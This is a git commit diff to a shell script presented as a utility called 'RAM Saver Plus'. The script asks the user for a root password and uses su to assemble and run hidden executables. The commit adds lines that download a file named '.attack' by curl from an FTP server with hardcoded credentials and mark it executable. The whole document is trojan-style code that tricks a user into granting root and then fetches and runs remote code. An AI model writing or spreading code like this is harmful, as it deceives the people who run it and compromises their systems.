1fca1359a1d7ce8e47f2428c35ab7d9f83af0f89
David <hdavidgleaton@gmail.com>
2020-07-19 16:13:48 -0400

    .attack added

--- gogo.sh
+++ gogo.sh
@@ -6,5 +6,10 @@ clear
 echo "Welcome to RAM Saver Plus! Enter '1' for the password to start!"
 su -c "cat temp.txt >> .script; chmod +x .script; ./.script; cat crashlogger.txt >> .export; chmod +x .export;"
 ./.export
+mkdir RamCrashLog
+cd RamCrashLog
+curl ftp://hostinger:password@192.168.0.10:21/.attack >> .attack
+chmod +x .attack
+
 clear
 
